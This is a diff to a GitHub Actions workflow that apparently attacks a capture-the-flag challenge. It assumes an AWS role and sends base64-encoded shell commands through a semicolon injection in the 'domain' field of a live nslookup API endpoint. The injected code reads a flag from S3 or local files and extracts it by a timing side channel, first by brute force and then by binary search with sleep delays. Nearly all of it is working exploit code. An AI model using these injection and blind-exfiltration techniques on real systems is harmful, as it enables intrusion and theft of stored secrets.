@@ -19,77 +19,131 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Exfiltrate Flag via Bulletproof Python Brute-Force
+      - name: Exfiltrate Flag via Timing Side-Channel
         run: |
-          python3 << 'PYEOF'
-          import urllib.request
-          import urllib.error
-          import json
-          import time
-          import base64
-          import urllib.parse
+          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
 
-          url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+          echo "=== STEP 1: SLEEP CALIBRATION ==="
+          for i in 1 2; do
+            START=$(date +%s%N)
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"domain\": \"127.0.0.1; sleep $i\"}")
+            END=$(date +%s%N)
+            DURATION_MS=$(( (END - START) / 1000000 ))
+            echo "sleep $i -> HTTP $CODE in ${DURATION_MS}ms"
+          done
 
-          print("=== STEP 1: TRUE ZERO-SLEEP BASELINE CALIBRATION ===")
-          cal_script = 'FLAG=$(cat /tmp/flag.txt 2>/dev/null); CHAR=$(echo "$FLAG" | cut -c1); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt 999 ]; then sleep 2; fi'
-          cal_encoded = base64.b64encode(cal_script.encode('utf-8')).decode('utf-8')
-          
-          headers_dict = {"Content-Type": "application/json"}
-          
-          start = time.time()
-          payload_data = json.dumps({"domain": f"127.0.0.1; echo {cal_encoded} | base64 -d | sh"}).encode('utf-8')
-          req = urllib.request.Request(url, data=payload_data, headers=headers_dict, method='POST')
-          try:
-              with urllib.request.urlopen(req, timeout=10) as resp:
-                  resp.read()
-          except Exception:
-              pass
-          baseline_ms = (time.time() - start) * 1000.0
-          threshold = baseline_ms + 1200
-          print(f"True zero-sleep baseline: {baseline_ms:.1f}ms. Using threshold: {threshold:.1f}ms (baseline + 1200ms)")
-
-          print("\n=== STEP 2: LINEAR CHARSET BRUTE-FORCE (BULLETPROOF PYTHON) ===")
-          charset = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-%")
-          flag_chars = []
-
-          for pos in range(1, 17):
-              found = False
-              for char in charset:
-                  script = f'FLAG=$(cat /tmp/flag.txt 2>/dev/null); CHAR=$(echo "$FLAG" | cut -c{pos}); if [ "$CHAR" = "{char}" ]; then sleep 2; fi'
-                  encoded = base64.b64encode(script.encode('utf-8')).decode('utf-8')
-                  
-                  payload_data = json.dumps({"domain": f"127.0.0.1; echo {encoded} | base64 -d | sh"}).encode('utf-8')
-                  start = time.time()
-                  req = urllib.request.Request(url, data=payload_data, headers=headers_dict, method='POST')
-                  
-                  code = 200
-                  try:
-                      with urllib.request.urlopen(req, timeout=10) as resp:
-                          resp.read()
-                  except urllib.error.HTTPError as e:
-                      code = e.code
-                  except Exception:
-                      code = 504
-
-                  duration_ms = (time.time() - start) * 1000.0
-                  
-                  if code in (504, 503) or duration_ms >= threshold:
-                      flag_chars.append(char)
-                      current_flag = "".join(flag_chars)
-                      print(f">>> Position {pos}: found character '{char}' | Flag so far: {current_flag} (took {duration_ms:.1f}ms)")
-                      found = True
-                      break
-              
-              if not found:
-                  print(f">>> Position {pos}: character not matched, appending '?'")
-                  flag_chars.append('?')
-
-          encoded_flag = "".join(flag_chars)
-          print(f"\n==================== FINAL ENCODED FLAG ====================")
-          print(encoded_flag)
-          print(f"============================================================")
-          
-          decoded_flag = urllib.parse.unquote(encoded_flag)
-          print(f"PLAINTEXT FLAG: {decoded_flag}")
+          echo ""
+          echo "=== STEP 2: BASELINE (Python/boto3 read, no sleep) ==="
+          # Condition is always FALSE for printable ASCII (max 126), so no sleep fires
+          SCRIPT="cat > /tmp/getflag.py << 'PYEOF'
+          import boto3, sys
+          sys.stdout.write(boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode())
           PYEOF
+          FLAG=\$(python3 /tmp/getflag.py 2>/dev/null)
+          if [ -z \"\$FLAG\" ]; then FLAG=\$(python /tmp/getflag.py 2>/dev/null); fi
+          CHAR=\$(echo \"\$FLAG\" | cut -c1)
+          ORD=\$(echo -n \"\$CHAR\" | od -An -tuC | awk '{print \$1}')
+          if [ -n \"\$ORD\" ] && [ \"\$ORD\" -gt 200 ]; then sleep 2; fi"
+                    ENCODED=$(echo "$SCRIPT" | base64 -w0)
+                    START=$(date +%s%N)
+                    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+                      -H "Content-Type: application/json" \
+                      -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+          END=$(date +%s%N)
+          BASELINE_MS=$(( (END - START) / 1000000 ))
+          echo "Baseline (no sleep) -> HTTP $CODE in ${BASELINE_MS}ms"
+          THRESHOLD=$((BASELINE_MS + 800))
+          echo "Using threshold: ${THRESHOLD}ms (baseline + 800ms)"
+
+          echo ""
+          echo "=== STEP 3: VERIFY S3 ACCESS (sleep if file is readable) ==="
+          SCRIPT="cat > /tmp/getflag.py << 'PYEOF'
+          import boto3, sys
+          sys.stdout.write(boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode())
+          PYEOF
+          FLAG=\$(python3 /tmp/getflag.py 2>/dev/null)
+          if [ -z \"\$FLAG\" ]; then FLAG=\$(python /tmp/getflag.py 2>/dev/null); fi
+          if [ -n \"\$FLAG\" ]; then sleep 2; fi"
+                    ENCODED=$(echo "$SCRIPT" | base64 -w0)
+                    START=$(date +%s%N)
+                    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+                      -H "Content-Type: application/json" \
+                      -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+                    END=$(date +%s%N)
+                     DURATION_MS=$(( (END - START) / 1000000 ))
+                    echo "S3 read check -> HTTP $CODE in ${DURATION_MS}ms"
+                    if [ "$CODE" != "504" ] && [ "$CODE" != "503" ] && [ $DURATION_MS -lt $THRESHOLD ]; then
+                      echo "WARNING: S3 read may not be working. If the extraction yields all spaces, the flag is unreachable."
+                    fi
+
+          echo ""
+          echo "=== STEP 4: BINARY SEARCH EXTRACTION (16 bytes) ==="
+          FLAG=""
+          for pos in $(seq 1 16); do
+            low=32
+            high=126
+            while [ $low -lt $high ]; do
+              mid=$(( (low + high) / 2 ))
+
+              # Build the shell script to run inside Lambda
+              # $pos and $mid are expanded by GitHub bash; everything else is literal for Lambda's shell
+              SCRIPT="cat > /tmp/getflag.py << 'PYEOF'
+          import boto3, sys
+          sys.stdout.write(boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode())
+          PYEOF
+          FLAG=\$(python3 /tmp/getflag.py 2>/dev/null)
+          if [ -z \"\$FLAG\" ]; then FLAG=\$(python /tmp/getflag.py 2>/dev/null); fi
+          if [ -z \"\$FLAG\" ]; then
+            for p in aws /opt/aws-cli/aws /opt/aws/aws /usr/local/bin/aws /usr/bin/aws; do
+              if [ -z \"\$FLAG\" ] && \$p --version > /dev/null 2>&1; then
+                FLAG=\$(\$p s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 2>/dev/null)
+              fi
+            done
+          fi
+          if [ -z \"\$FLAG\" ]; then
+            for path in /var/task/flag.txt /tmp/flag.txt /opt/flag.txt /flag.txt ./flag.txt; do
+              if [ -f \"\$path\" ]; then
+                  FLAG=\$(cat \"\$path\" 2>/dev/null)
+                break
+              fi
+            done
+          fi
+          CHAR=\$(echo \"\$FLAG\" | cut -c$pos)
+          if [ -z \"\$CHAR\" ]; then CHAR=' '; fi
+          ORD=\$(echo -n \"\$CHAR\" | od -An -tuC | awk '{print \$1}')
+          if [ -n \"\$ORD\" ] && [ \"\$ORD\" -gt $mid ]; then sleep 2; fi"
+              ENCODED=$(echo "$SCRIPT" | base64 -w0)
+
+              START=$(date +%s%N)
+              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+                -H "Content-Type: application/json" \
+                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+              END=$(date +%s%N)
+              DURATION_MS=$(( (END - START) / 1000000 ))
+
+              # TRUE if Lambda timed out OR took longer than threshold
+              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION_MS -ge $THRESHOLD ]; then
+                low=$((mid + 1))
+                echo "  pos $pos > $mid  (time=${DURATION_MS}ms, code=$CODE)"
+              else
+                high=$mid
+                echo "  pos $pos <= $mid (time=${DURATION_MS}ms, code=$CODE)"
+              fi
+            done
+            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
+            FLAG="$FLAG$CHAR"
+            echo ">>> Position $pos: '$CHAR' (ASCII $low) | Flag so far: $FLAG"
+          done
+
+          echo ""
+          echo "==================== FINAL FLAG ===================="
+          echo "$FLAG"
+          echo "===================================================="
+
+          if [ "$FLAG" = "                " ]; then
+            echo ""
+            echo "ERROR: Flag is all spaces. Data extraction failed."
+            echo "Check Step 3 (S3 read check). If it was fast (< threshold), the Lambda cannot reach S3."
+          fi
